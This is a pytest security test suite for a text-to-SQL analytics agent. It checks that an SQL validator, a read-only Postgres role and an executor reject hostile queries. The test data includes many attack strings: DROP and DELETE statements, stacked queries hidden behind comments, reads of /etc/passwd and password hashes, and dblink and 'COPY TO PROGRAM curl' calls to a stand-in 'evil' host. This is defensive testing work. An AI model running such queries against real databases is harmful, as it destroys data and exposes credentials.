"""Attack cases (CLAUDE.md Security model §8). Each layer is tested on its own:
the SQL validator, the database role (bypassing the validator), and the executor.
API / prompt-injection / guardrail cases are added in Phase 6.
"""

import json

import pytest

from agents.sql_validator import validate

# ------------------------------------------------------------ layer 1: validator

ATTACKS = {
    # write / DDL statements
    "drop_table": "DROP TABLE fact_orders",
    "delete": "DELETE FROM fact_orders WHERE order_id = 1",
    "update": "UPDATE dim_product SET list_price = 1",
    "insert": "INSERT INTO dim_region VALUES (9, 'X', 'Y')",
    "truncate": "TRUNCATE fact_order_items",
    "alter": "ALTER TABLE dim_store ADD COLUMN x int",
    "create_table_as": "CREATE TABLE analytics.copy AS SELECT * FROM dim_store",
    "create_function": "CREATE FUNCTION f() RETURNS int LANGUAGE sql AS 'SELECT 1'",
    "grant": "GRANT ALL ON fact_orders TO PUBLIC",
    "merge": "MERGE INTO dim_region r USING dim_region s ON r.region_id = s.region_id WHEN MATCHED THEN DELETE",
    "cte_delete": "WITH d AS (DELETE FROM fact_orders RETURNING *) SELECT COUNT(*) FROM d",
    "cte_update": "WITH u AS (UPDATE dim_product SET list_price = 0 RETURNING product_id) SELECT * FROM u",
    "cte_insert": "WITH i AS (INSERT INTO dim_region VALUES (9,'X','Y') RETURNING *) SELECT * FROM i",
    "select_into": "SELECT * INTO stolen FROM dim_store",
    # statement chaining and comment tricks
    "stacked_drop": "SELECT 1; DROP TABLE fact_orders",
    "stacked_selects": "SELECT 1; SELECT 2",
    "stacked_after_comment_newline": "SELECT 1 -- harmless\n; DELETE FROM fact_orders",
    "comment_smuggled_block": "SELECT region_name FROM dim_region /* ; DROP TABLE dim_region; */",
    "comment_smuggled_line": "SELECT region_name FROM dim_region -- ; DELETE FROM fact_orders",
    # disallowed functions
    "pg_sleep": "SELECT pg_sleep(30)",
    "pg_sleep_in_where": "SELECT region_name FROM dim_region WHERE pg_sleep(5) IS NOT NULL",
    "pg_read_file": "SELECT pg_read_file('/etc/passwd')",
    "pg_ls_dir": "SELECT pg_ls_dir('.')",
    "dblink": "SELECT * FROM dblink('host=evil', 'SELECT 1') AS t(x int)",
    "dblink_exec": "SELECT dblink_exec('host=evil', 'DROP TABLE x')",
    "lo_import": "SELECT lo_import('/etc/passwd')",
    "lo_export": "SELECT lo_export(1234, '/tmp/x')",
    "set_config": "SELECT set_config('default_transaction_read_only', 'off', false)",
    "current_setting": "SELECT current_setting('data_directory')",
    "now": "SELECT COUNT(*) FROM fact_orders WHERE order_date > now() - INTERVAL '30 days'",
    "current_date": "SELECT COUNT(*) FROM fact_orders WHERE order_date = current_date",
    "version": "SELECT version()",
    "current_user": "SELECT current_user",
    "generate_series_dos": "SELECT COUNT(*) FROM generate_series(1, 100000000000)",
    "string_agg": "SELECT string_agg(city, ',') FROM dim_store",
    "schema_qualified_function": "SELECT pg_catalog.count(*) FROM dim_region",
    "user_defined_function": "SELECT analytics.evil(1)",
    "regclass_cast": "SELECT 'pg_authid'::regclass",
    "row_constructor": "SELECT ROW(s.store_id, s.city) FROM dim_store s",
    # catalogs, other schemas, unknown objects, system columns
    "pg_catalog_authid": "SELECT rolname, rolpassword FROM pg_catalog.pg_authid",
    "pg_class_unqualified": "SELECT relname FROM pg_class",
    "pg_user": "SELECT usename FROM pg_user",
    "information_schema": "SELECT table_name FROM information_schema.tables",
    "public_schema": "SELECT * FROM public.anything",
    "other_catalog": "SELECT order_id FROM otherdb.analytics.fact_orders",
    "pg_temp_schema": "SELECT * FROM pg_temp.t",
    "quoted_case_table": 'SELECT region_name FROM "DIM_REGION"',
    "unknown_table": "SELECT * FROM sales",
    "unknown_column": "SELECT revenue FROM fact_orders",
    "unknown_column_qualified": "SELECT o.profit FROM fact_orders o",
    "system_column_ctid": "SELECT ctid FROM dim_store",
    "system_column_xmin": "SELECT s.xmin FROM dim_store s",
    "whole_row_reference": "SELECT c FROM dim_customer c",
    # restricted column (customer name) in output
    "name_direct": "SELECT name FROM dim_customer",
    "name_qualified": "SELECT c.customer_id, c.name FROM dim_customer c",
    "name_aliased": "SELECT c.name AS label FROM dim_customer c",
    "name_via_cte": "WITH x AS (SELECT name AS n FROM dim_customer) SELECT n FROM x",
    "name_via_nested_cte": """WITH a AS (SELECT name FROM dim_customer), b AS (SELECT name AS z FROM a)
                              SELECT z FROM b""",
    "name_via_subquery": "SELECT t.n FROM (SELECT name AS n FROM dim_customer) t",
    "name_scalar_subquery": "SELECT (SELECT c.name FROM dim_customer c LIMIT 1) AS x",
    "name_upper": "SELECT upper(name) FROM dim_customer",
    "name_min": "SELECT min(name) FROM dim_customer",
    "name_concat": "SELECT concat('x', name) FROM dim_customer",
    "name_case": "SELECT CASE WHEN customer_id > 0 THEN name END FROM dim_customer",
    "name_cast": "SELECT name::text FROM dim_customer",
    "name_window": "SELECT first_value(name) OVER (ORDER BY customer_id) FROM dim_customer",
    "name_star": "SELECT * FROM dim_customer",
    "name_table_star": "SELECT c.* FROM dim_customer c",
    "name_star_via_join": "SELECT * FROM fact_orders o JOIN dim_customer c ON c.customer_id = o.customer_id",
    "name_union": "SELECT city FROM dim_store UNION SELECT name FROM dim_customer",
    "name_union_second_column": "SELECT city, state FROM dim_store UNION ALL SELECT city, name FROM dim_customer",
    "name_functional_notation": "SELECT name(c) FROM dim_customer c",
    "name_cte_shadowing_star": "WITH t AS (SELECT * FROM dim_customer) SELECT * FROM t",
    "name_via_lateral": "SELECT x.n FROM dim_customer c, LATERAL (SELECT c.name AS n) x",
    "name_via_lateral_cte": """WITH l AS (SELECT x.n FROM dim_customer c
                               CROSS JOIN LATERAL (SELECT upper(c.name) AS n) x) SELECT * FROM l""",
    "name_intersect": "SELECT 'Some Name' AS x INTERSECT SELECT name FROM dim_customer",
    "name_scalar_subquery_in_cte": """WITH x AS (SELECT (SELECT d.name FROM dim_customer d
        WHERE d.customer_id = o.customer_id) AS n FROM fact_orders o) SELECT n FROM x""",
    # locking, session and utility statements
    "for_update": "SELECT * FROM dim_region FOR UPDATE",
    "for_share": "SELECT region_id FROM dim_region FOR SHARE",
    "for_no_key_update_in_cte": "WITH x AS (SELECT region_id FROM dim_region FOR NO KEY UPDATE) SELECT * FROM x",
    "set": "SET statement_timeout = 0",
    "set_role": "SET ROLE postgres",
    "reset": "RESET ALL",
    "show": "SHOW data_directory",
    "listen": "LISTEN channel",
    "notify": "NOTIFY channel, 'x'",
    "unlisten": "UNLISTEN *",
    "copy_to_file": "COPY fact_orders TO '/tmp/out.csv'",
    "copy_program": "COPY (SELECT 1) TO PROGRAM 'curl evil'",
    "do_block": "DO $$ BEGIN PERFORM pg_sleep(10); END $$",
    "explain_analyze": "EXPLAIN ANALYZE SELECT * FROM fact_orders",
    "begin": "BEGIN",
    "vacuum": "VACUUM fact_orders",
    "prepare": "PREPARE p AS SELECT 1",
    "call": "CALL do_things()",
    "lock_table": "LOCK TABLE fact_orders",
    "recursive_cte": "WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM r) SELECT COUNT(*) FROM r",
    "placeholder": "SELECT * FROM dim_region WHERE region_id = $1",
    "table_statement": "TABLE dim_customer",
    "values_statement": "VALUES (1)",
    "empty": "",
    "only_comment": "-- nothing here",
    "garbage": "SELEC region_name FRM dim_region",
    "nul_byte": "SELECT region_name FROM dim_region\x00; DROP TABLE x",
    "deep_nesting": "SELECT " + "(" * 3000 + "1" + ")" * 3000,
    "oversized": "SELECT order_id FROM fact_orders WHERE order_id IN (" + ",".join(map(str, range(20000))) + ")",
}


@pytest.mark.parametrize("sql", ATTACKS.values(), ids=ATTACKS.keys())
def test_validator_rejects_attack(sql):
    r = validate(sql)
    assert not r.ok
    assert r.errors
    assert r.normalized_sql is None


def test_at_least_30_attack_cases():
    assert len(ATTACKS) >= 30


def test_validator_errors_do_not_echo_internals():
    """Validator messages are fed back to the generator; they name the problem only."""
    r = validate("SELECT rolpassword FROM pg_catalog.pg_authid")
    assert not r.ok
    assert all(len(e) < 200 for e in r.errors)


# ------------------------------------------- layer 2: database role on its own

DB_DENIED = {
    # privileges are checked with an explicit READ WRITE transaction, so the denial comes
    # from missing grants, not only from default_transaction_read_only.
    "insert": "INSERT INTO analytics.dim_region VALUES (9, 'X', 'Y')",
    "update": "UPDATE analytics.dim_product SET list_price = 1",
    "delete": "DELETE FROM analytics.fact_orders",
    "create_table": "CREATE TABLE analytics.x (i int)",
    "create_table_unqualified": "CREATE TABLE x (i int)",
    "create_function": "CREATE FUNCTION analytics.f() RETURNS int LANGUAGE sql AS 'SELECT 1'",
    "create_function_pg_temp": "CREATE FUNCTION pg_temp.f() RETURNS int LANGUAGE sql AS 'SELECT 1'",
    "create_temp_table": "CREATE TEMP TABLE t (i int)",
    "create_view": "CREATE VIEW analytics.v AS SELECT 1",
    "create_public": "CREATE TABLE public.x (i int)",
    "pg_read_file": "SELECT pg_read_file('/etc/passwd')",
    "pg_authid": "SELECT rolpassword FROM pg_catalog.pg_authid",
    "copy_to_file": "COPY analytics.dim_region TO '/tmp/x.csv'",
    "set_role": "SET ROLE admin",
}


@pytest.mark.parametrize("sql", DB_DENIED.values(), ids=DB_DENIED.keys())
def test_db_denies_as_analyst_ro(ro_conninfo, sql):
    import psycopg

    with psycopg.connect(ro_conninfo) as conn:
        conn.execute("SET TRANSACTION READ WRITE")
        with pytest.raises(psycopg.errors.InsufficientPrivilege):
            conn.execute(sql)


def test_db_role_settings(ro_conninfo):
    import psycopg

    with psycopg.connect(ro_conninfo) as conn:
        row = conn.execute(
            """SELECT current_user, current_setting('search_path'),
                      current_setting('default_transaction_read_only'),
                      current_setting('statement_timeout'),
                      r.rolconnlimit, r.rolsuper, r.rolcreaterole, r.rolcreatedb
               FROM pg_roles r WHERE r.rolname = current_user"""
        ).fetchone()
        assert row == ("analyst_ro", "analytics", "on", "15s", 20, False, False, False)
        # no CREATE on any schema, no TEMP on the database
        assert conn.execute(
            """SELECT bool_or(has_schema_privilege(current_user, nspname, 'CREATE'))
               FROM pg_namespace"""
        ).fetchone()[0] is False
        assert conn.execute(
            "SELECT has_database_privilege(current_user, current_database(), 'TEMP')"
        ).fetchone()[0] is False


def test_db_read_only_by_default(ro_conninfo):
    import psycopg

    with psycopg.connect(ro_conninfo) as conn:
        with pytest.raises(psycopg.errors.ReadOnlySqlTransaction):
            conn.execute("CREATE TABLE analytics.x (i int)")


# --------------------------------------------------- layer 3: executor caps/errors

def test_cost_cap_rejects_cartesian_join(executor, audit_path):
    sql = "SELECT COUNT(*) FROM fact_order_items a CROSS JOIN fact_order_items b"
    assert validate(sql).ok  # passes the validator: only the cost cap stops it
    r = executor.run(sql)
    assert not r.ok and r.error_code == "cost_limit"
    assert r.records == [] and r.cost is not None and r.cost > executor.max_cost


def test_cost_cap_rejects_cartesian_with_dimensions(executor, audit_path):
    r = executor.run("SELECT COUNT(*) FROM fact_orders, dim_customer, dim_date")
    assert not r.ok and r.error_code == "cost_limit"


def test_row_cap_clamps_huge_limit(executor, audit_path):
    r = executor.run("SELECT order_id FROM fact_orders ORDER BY order_id LIMIT 100000")
    assert r.ok and r.row_count == executor.max_rows


def test_executor_rejects_attack_without_touching_db(executor, audit_path):
    r = executor.run("SELECT 1; DROP TABLE analytics.fact_orders")
    assert not r.ok and r.error_code == "validation_failed" and r.validation_errors
    assert r.cost is None


def test_db_error_is_generic_and_logged(executor, audit_path):
    r = executor.run("SELECT 1 / (region_id - region_id) AS boom FROM dim_region")
    assert not r.ok and r.error_code == "db_error"
    user_facing = json.dumps(r.public_dict())
    assert "division" not in user_facing.lower()
    assert "psycopg" not in user_facing.lower() and "Traceback" not in user_facing
    assert r.error == "Could not answer this question." and r.request_id
    log = [json.loads(line) for line in audit_path.read_text().splitlines()]
    entry = next(e for e in log if e["request_id"] == r.request_id and e["event"] == "sql_error")
    assert "division by zero" in entry["error"]


def test_secrets_never_in_audit_log(executor, audit_path):
    from app.config import get_settings

    executor.run("SELECT 1 / (region_id - region_id) FROM dim_region")
    executor.run("SELECT pg_sleep(1)")
    text = audit_path.read_text()
    url = get_settings().database_url_ro.get_secret_value()
    password = url.split("://", 1)[1].split("@", 1)[0].split(":", 1)[1]
    assert password not in text and url not in text


def test_redact_masks_urls_and_keys():
    from app.audit import redact

    s = redact("connect postgresql+psycopg://analyst_ro:hunter22@db:5432/x key sk-or-v1-abcdef123456")
    assert "hunter22" not in s and "sk-or-v1-abcdef123456" not in s
    assert "analyst_ro:***@db" in s
